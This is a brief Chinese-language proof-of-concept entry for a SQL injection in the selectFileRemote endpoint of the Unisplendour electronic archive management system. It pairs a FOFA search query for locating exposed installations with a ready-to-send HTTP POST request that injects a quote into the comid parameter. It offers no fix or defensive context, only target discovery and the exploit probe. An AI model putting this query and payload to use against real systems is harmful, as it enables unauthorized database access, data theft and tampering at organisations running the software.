# 紫光电子档案管理系统selectFileRemote存在SQL注入漏洞

紫光电子档案管理系统selectFileRemote存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
body="www.unissoft.com"
```

## poc

```javascript
POST /Archive/ErecordManage/selectFileRemote HTTP/1.1
Host: {{Hostname}}
Accept: */* Accept-Encoding: gzip, deflate
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded

userID=admin&fondsid=1&comid=1'
```

